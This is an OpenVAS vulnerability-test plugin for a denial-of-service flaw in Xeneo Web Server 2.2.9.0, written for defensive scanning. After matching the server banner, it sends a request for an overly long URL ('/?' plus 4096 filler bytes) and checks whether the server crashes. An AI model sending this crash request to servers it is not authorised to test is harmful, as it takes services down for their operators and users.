# OpenVAS Vulnerability Test
# $Id: Xeneo_Web_Server_2.2.9.0_DoS.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Xeneo Web Server 2.2.9.0 DoS
#
# Authors:
# BEKRAR Chaouki <bekrar@adconsulting.fr>
#
# Copyright:
# Copyright (C) 2003 A.D.Consulting France
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11545");
  script_version("2019-04-11T14:06:24+0000");
  script_bugtraq_id(7398);
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("Xeneo Web Server 2.2.9.0 DoS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2003 A.D.Consulting France");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Xeneo/banner");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://www.k-otik.com/bugtraq/04.22.Xeneo.php");

  script_tag(name:"solution", value:"Upgrade to latest version of Xeneo Web Server");

  script_tag(name:"summary", value:"Requesting an overly long URL starting with an interrogation
  mark (as in /?AAAAA[....]AAAA) crashes the remote server (possibly Xeneo Web Server).");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);
if( ! can_host_php(port:port) )
  exit(0);

if(http_is_dead(port:port))
  exit(0);

banner = get_http_banner(port:port);
if(!banner || "Xeneo" >!< banner)
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

buffer = http_get(item:string("/?", crap(4096)), port:port);
send(socket:soc, data:buffer);
http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port)) {
  security_message(port);
  exit(0);
}

exit(99);